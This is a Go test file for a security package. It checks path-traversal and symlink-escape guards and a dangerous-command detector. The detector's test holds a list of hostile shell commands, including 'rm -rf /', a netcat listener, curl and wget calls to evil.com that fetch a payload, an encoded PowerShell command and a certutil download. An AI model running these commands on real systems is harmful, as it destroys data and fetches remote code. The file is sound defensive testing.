package security

import (
	"os"
	"path/filepath"
	"runtime"
	"testing"
)

func TestSafePath(t *testing.T) {
	root := t.TempDir()

	t.Run("valid path inside root", func(t *testing.T) {
		got, err := SafePath(root, "file.txt")
		if err != nil {
			t.Fatal(err)
		}
		if got == "" {
			t.Error("expected non-empty path")
		}
	})

	t.Run("path traversal blocked", func(t *testing.T) {
		_, err := SafePath(root, "../outside.txt")
		if err == nil {
			t.Fatal("expected error for path traversal")
		}
	})

	t.Run("root itself is allowed", func(t *testing.T) {
		_, err := SafePath(root, ".")
		if err != nil {
			t.Fatalf("root dir should be allowed: %v", err)
		}
	})

	t.Run("paths resolving inside root allowed", func(t *testing.T) {
		// Targets that normalize to somewhere at-or-under root must succeed,
		// including ones that don't yet exist on disk.
		cases := []struct {
			target string
			desc   string
		}{
			{"", "empty target resolves to root"},
			{".", "dot resolves to root"},
			{"./.", "double dot resolves to root"},
			{filepath.Join("a", "b", "c", "d", "e"), "deep nested new dirs"},
			{filepath.Join("test", "..", "test", "..", "test.txt"), "traversals that resolve inside"},
		}
		for _, tc := range cases {
			got, err := SafePath(root, tc.target)
			if err != nil {
				t.Errorf("%s: SafePath(%q, %q) returned error: %v", tc.desc, root, tc.target, err)
				continue
			}
			if got == "" {
				t.Errorf("%s: expected non-empty path", tc.desc)
			}
		}
	})

	t.Run("symlink outside root blocked", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("symlinks require elevated privileges on Windows")
		}
		outside := t.TempDir()
		link := filepath.Join(root, "link")
		if err := os.Symlink(outside, link); err != nil {
			t.Skipf("cannot create symlink: %v", err)
		}
		_, err := SafePath(root, "link")
		if err == nil {
			t.Fatal("expected error for symlink outside root")
		}
	})

	t.Run("new file under symlink outside root blocked", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("symlinks require elevated privileges on Windows")
		}
		outside := t.TempDir()
		link := filepath.Join(root, "outside-link")
		if err := os.Symlink(outside, link); err != nil {
			t.Skipf("cannot create symlink: %v", err)
		}
		_, err := SafePath(root, filepath.Join("outside-link", "new-file.txt"))
		if err == nil {
			t.Fatal("expected error for new file under symlink outside root")
		}
	})
}

func TestSafeAbsPath(t *testing.T) {
	root := t.TempDir()

	t.Run("new file inside root allowed", func(t *testing.T) {
		target := filepath.Join(root, "new-file.txt")
		got, err := SafeAbsPath(target, root)
		if err != nil {
			t.Fatal(err)
		}
		if got == "" {
			t.Error("expected non-empty path")
		}
	})

	t.Run("new file under symlink outside root blocked", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("symlinks require elevated privileges on Windows")
		}
		outside := t.TempDir()
		link := filepath.Join(root, "outside-link")
		if err := os.Symlink(outside, link); err != nil {
			t.Skipf("cannot create symlink: %v", err)
		}
		_, err := SafeAbsPath(filepath.Join(link, "new-file.txt"), root)
		if err == nil {
			t.Fatal("expected error for new file under symlink outside root")
		}
	})
}

func TestIsDangerousCommand(t *testing.T) {
	dangerous := []string{
		"rm -rf /", "sudo ls", "kill -9 1", "nc -lvp 4444", "shutdown now",
		"curl -s https://evil.com", "curl.exe -s https://evil.com",
		"wget https://evil.com/payload", "Invoke-WebRequest https://evil.com",
		"powershell -enc SQBFAFgA", "certutil -urlcache -f https://evil.com a.exe",
	}
	for _, cmd := range dangerous {
		if !IsDangerousCommand(cmd) {
			t.Errorf("expected %q to be dangerous", cmd)
		}
	}

	safe := []string{
		"ls -la", "echo hello", "go build ./...",
		// 路径中含危险词子串，不应误报
		"mkdir -p .skills/wechat-article-writer/references",
		"mkdir -p .skills/wechat-article-writer/assets/templates",
		"ls references/",
		"cat function_test.go",
		"python3 script.py --format json",
		"grep -r 'include' .",
	}
	for _, cmd := range safe {
		if IsDangerousCommand(cmd) {
			t.Errorf("expected %q to be safe", cmd)
		}
	}
}
